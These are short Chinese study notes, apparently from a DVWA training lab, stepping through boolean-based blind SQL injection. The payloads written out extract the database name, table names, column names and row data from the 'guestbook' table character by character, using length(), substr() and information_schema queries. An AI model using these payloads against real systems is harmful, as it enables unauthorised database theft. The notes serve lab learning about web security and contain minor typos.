![[Pasted image 20251122204103.png]]
1
用length()函数确认数据库名。
如length（database（））=4
如出现exit 则说明数据库名为4个字符。
2
获取数据库名用substr（string，start，length）
string是截取的字符串名，start从哪个位置截取，length截取长度然后一个一个试。
3
获取表的数量
count（）函数
入 1' and (select count(table_name) from information_schema.tables where。。。=2若出现正常页面则说明有两张数据表
4
表名长度获取： 1' and length((select table_name from
information_schema.tables where table_schema=database() limit 0,1))=9%23，如出现正常页面则说明表名长度为九。limit 0，1说明是第一个表
获得具体表名：
1' and substr((select table_name from
information_schema.tables where table_schema=database() limit 0,1),1,1)='g'%23
时，页面返回"User ID exists in the database."，说明第一个字母是 g 。
5
获取表中列数：
 1' and (select count(column_name) from
information_schema.columns where table_name="guestbook" and
table_schema="dvwa")=3%23
6
获取列名长度 1' and length((select column_name from
information_schema.columns where table_name='guestbook' and table_schema='dvwa'
limit 0,1))=10%23 
7
获取列名 1' and substr((select column_name from
information_schema.columns where table _name='guestbook' and table_schema=dvwa
limit 0,1),1,1)='c'%23若正常，则显示好处
8
1' and (select count(comment_id) from guestbook)=1%23 时，页面返回"User ID
exists in the database."，说明 guestbook 表的 comment_id 列中只有一行记录。
9
一列的记名长度
' and (select length(comment_id) from guestbook limit 0,1)=1%23 时，页面返回正常是
10
获取具体数据
1' and substr((select comment_id from guestbook limit 0,1),1,1)='1'